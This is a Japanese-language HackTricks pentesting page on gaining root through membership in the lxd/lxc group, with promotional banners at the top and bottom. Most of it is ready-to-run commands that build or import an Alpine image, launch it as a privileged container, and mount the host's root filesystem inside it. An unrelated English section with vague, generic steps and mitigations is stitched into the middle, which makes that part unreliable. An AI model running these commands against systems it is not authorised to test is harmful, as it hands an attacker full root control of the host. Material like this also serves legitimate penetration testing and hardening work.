# lxd/lxcグループ - 特権昇格

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

もし _**lxd**_ **または** _**lxc**_ **グループに所属している場合、rootになることができます**

## インターネットなしでの攻撃

### 方法1

このディストロビルダーをマシンにインストールすることができます: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(githubの指示に従ってください):
```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```
次に、脆弱なサーバーに **lxd.tar.xz** と **rootfs.squashfs** のファイルをアップロードします。

イメージを追加します：
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
# LXD Privilege Escalation

## Introduction

This document explains a privilege escalation technique in LXD, a container hypervisor for Linux systems. By exploiting misconfigurations in LXD, an attacker can gain root privileges within a container and potentially escalate their privileges on the host system.

## Prerequisites

To perform this attack, you need the following:

- Access to a Linux system with LXD installed.
- Basic knowledge of Linux command-line interface (CLI) and LXD commands.

## Attack Scenario

1. **Create a Container**: First, create a new container using the LXD command-line tool. Specify the desired Linux distribution and version for the container.

   ```bash
   lxc launch <image> <container-name>
   ```

2. **Add Root Path**: Once the container is created, add the root path to the container's configuration. This will allow the container to access the host system's root filesystem.

   ```bash
   lxc config device add <container-name> root disk source=/ path=/
   ```

   This command adds a new device named "root" to the container's configuration, with the source set to the host system's root filesystem ("/") and the path set to the root directory ("/") within the container.

3. **Start the Container**: Start the container to apply the changes made to its configuration.

   ```bash
   lxc start <container-name>
   ```

4. **Access the Container**: Once the container is running, access its shell using the LXD command-line tool.

   ```bash
   lxc exec <container-name> -- /bin/bash
   ```

5. **Privilege Escalation**: Within the container's shell, execute commands to escalate privileges and gain root access. This can be achieved by exploiting vulnerabilities or misconfigurations within the container or the host system.

## Mitigation

To prevent privilege escalation attacks in LXD, follow these best practices:

- Regularly update LXD and the host system to ensure that security patches are applied.
- Limit the privileges of LXD containers by using appropriate Linux user namespaces and resource restrictions.
- Avoid adding the root path to containers unless absolutely necessary, and carefully review the security implications before doing so.
- Implement strong access controls and monitor container activity for any suspicious behavior.

By following these guidelines, you can reduce the risk of privilege escalation attacks in LXD containers.
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
{% hint style="danger" %}
もしエラーが発生した場合 _**エラー: ストレージプールが見つかりません。新しいストレージプールを作成してください**_\
**`lxd init`** を実行し、前のコマンドのチャンクを**繰り返して**ください
{% endhint %}

コンテナを実行します：
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 方法2

Alpineイメージをビルドし、フラグ`security.privileged=true`を使用して起動します。これにより、コンテナがホストのファイルシステムとしてrootとして対話するように強制されます。
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
Alternatively [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)

## インターネットを使用する場合

[こちらの手順](https://reboare.github.io/lxd/lxd-escape.html)に従うことができます。
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
## その他の参考資料

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
